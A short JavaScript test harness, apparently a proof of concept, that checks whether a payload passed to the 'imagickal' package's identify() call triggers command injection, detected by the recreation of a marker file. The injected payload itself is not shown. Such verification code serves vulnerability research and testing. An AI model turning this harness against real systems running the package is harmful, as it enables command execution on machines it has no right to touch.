function exploitFunction(payload) {
  const im = require("imagickal");
  const fs = require("fs");

  try {
    if (fs.existsSync("./imagickal")) {
      fs.unlinkSync("./imagickal");
      console.log("File removed: ./imagickal");
    }
  } catch (err) {
    console.error(err);
  }

  file_exist = fs.existsSync("./imagickal");
  expect(file_exist).toBe(false);

  return im.identify(payload)
    .catch((err) => {})
    .finally(() => {
      console.log("finally!");
      file_exist = fs.existsSync("./imagickal");
      expect(file_exist).toBe(true);
      fs.unlink("./imagickal", function (err) {});
    });
}

module.exports = { exploitFunction };